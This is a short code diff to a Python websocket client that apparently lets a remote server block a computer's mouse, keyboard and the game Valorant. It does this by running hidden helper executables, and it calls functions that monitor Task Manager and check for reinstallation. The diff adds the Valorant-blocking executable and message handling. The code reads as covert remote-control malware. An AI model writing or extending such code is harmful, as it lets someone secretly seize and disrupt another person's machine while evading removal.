@@ -18,7 +18,8 @@ async def pinger(ws):
         pass
 
 block_exe = resource_path("block_inputs.exe")
-if not os.path.isfile(block_exe):
+valorantblock_exe = resource_path("valorantblock.exe")
+if not os.path.isfile(block_exe) or not os.path.isfile(valorantblock_exe):
     sys.exit(1)
 
 mouse_proc = None
@@ -33,6 +34,7 @@ creationflags = subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROU
 state = {
     "mouse": None,
     "keyboard": None,
+    "valorant": None
 }
 
 monitor_taskmgr()
@@ -41,7 +43,8 @@ check_reinstall()
 async def receiver(ws):
     try:
         async for msg in ws:
-            handle_message(msg, block_exe, state, startupinfo, creationflags)
+            if msg != "PONG":
+                handle_message(msg, block_exe, valorantblock_exe, state, startupinfo, creationflags)
     except Exception:
         pass
 
@@ -61,7 +64,7 @@ async def main():
                         websockets.connect(server_url),
                         timeout=1400
                     )
-                    print("Conectado")
+                    print("Connected!")
                 except asyncio.TimeoutError:
                     print("Timeout ao conectar")
                     ws = None
